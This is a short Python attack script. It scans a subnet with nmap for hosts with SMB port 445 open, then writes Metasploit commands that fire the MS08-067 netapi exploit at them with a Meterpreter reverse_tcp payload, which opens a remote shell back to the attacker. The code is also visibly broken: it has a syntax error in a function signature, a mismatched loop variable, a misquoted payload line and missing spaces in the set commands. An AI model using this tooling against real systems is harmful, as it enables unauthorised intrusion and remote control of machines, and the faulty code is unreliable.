import os
import optparse
import sys
import nmap


def findtgts(subnet):
    nmscan = nmap.PortScanner()
    nmscan.scan(subnet, "445")
    tgthosts = []
    for hosts in nmscan.all_hosts():
        if nmscan[host].has_tcp(445):
            state = nmscan[host]["tcp"][445]["state"]
            if state == "open":
                print("[+] found target host:" + host)
                tgthosts.append(host)
    return tgthosts

def setuphandler(configfile. lhost, lport):
    configfile.write('use exploit/multi/handler\n')
    configfile.write("set payload 'windows/meterpreter/reverse_tcp\n'")
    configfile.write("set LPORT" + str(lport) + "\n")
    configfile.write("set LHOST" + str(lhost) + "\n")
    configfile.write("exploit -j -z\n")
    configfile.write("setg DisablePayloadHandler 1 \n")

def conflickerexploit(configfile, tgthost, lhost, lport):
    configfile.write("use exploit/windows/smb/ms08_067_netapi\n")
    configfile.write("set RHOST" + str(tgthost) + "\n")
    configfile.write("set payload windows/meterpreter/reverse_tcp\n")
    configfile.write("set LPORT" + str(lport) + "\n")
    configfile.write("set LHOST" + str(lhost) + "\n")
    configfile.write("exploit -j -z\n")

    
